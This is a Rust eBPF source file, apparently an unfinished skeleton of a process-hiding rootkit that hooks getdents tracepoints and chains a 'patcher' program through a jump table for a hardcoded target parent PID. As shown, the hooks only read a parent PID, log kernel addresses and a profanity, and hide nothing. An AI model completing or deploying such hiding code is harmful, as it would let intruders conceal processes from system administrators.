#![no_std]
#![no_main]

use core::ops::Add;

use aya_ebpf::{
    cty::{self, c_int, c_ulong},
    helpers::{bpf_get_current_pid_tgid, bpf_get_current_task, bpf_probe_read_kernel},
    macros::{map, tracepoint},
    maps::ProgramArray,
    programs::TracePointContext,
};
use aya_log_ebpf::info;

mod vmlinux;

use vmlinux::task_struct;

const PROG_HANDLER: u32 = 0;
const PROG_PATCHER: u32 = 1;
const trarget_ppid: i32 = 157034;

#[map]
static JUMP_TABLE: ProgramArray = ProgramArray::with_max_entries(2, 0);

#[tracepoint]
pub fn hide_me(ctx: TracePointContext) -> u32 {
    match handle_getdents_enter(ctx) {
        Ok(ret) => ret,
        Err(ret) => ret,
    }
}

fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
    let pid_tgid = bpf_get_current_pid_tgid();

    if pid_tgid != 0 {
        // struct task_struct *       real_parent;          /*  1448     8 */
        // pid_t                      tgid;                 /*  1436     4 */
        let ppid = unsafe {
            let task = bpf_get_current_task() as *const task_struct;

            if task.is_null() {
                return Err(0);
            }
            let real_parent = (*task).real_parent;

            if real_parent.is_null() {
                return Err(0);
            }

            let ppid = (*real_parent).tgid;
            info!(&ctx, "task is {:x}", task as u64);
            info!(&ctx, "real_parent address: {:x}", real_parent as u64);
            ppid
        };
    }
    // let real_parent_ptr = task.add(1448) as *const *const cty::c_void; // 指向 real_parent 的指针的指针
    // let real_parent =
    //     unsafe { bpf_probe_read_kernel::<*const cty::c_void>(real_parent_ptr).unwrap() };
    //
    // info!(&ctx, "tracepoint syscalls called");
    // unsafe {
    //     if JUMP_TABLE.tail_call(&ctx, PROG_HANDLER).is_err() {
    //         return Ok(0);
    //     };
    // }
    Ok(0)
}

#[tracepoint]
fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
    info!(&ctx, "hello");
    unsafe {
        if JUMP_TABLE.tail_call(&ctx, PROG_PATCHER).is_err() {
            return Ok(0);
        };
    }
    Ok(0)
}

#[tracepoint]
fn handle_getdents_patch(ctx: TracePointContext) -> Result<u32, u32> {
    info!(&ctx, "fuck you");
    Ok(0)
}

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    unsafe { core::hint::unreachable_unchecked() }
}
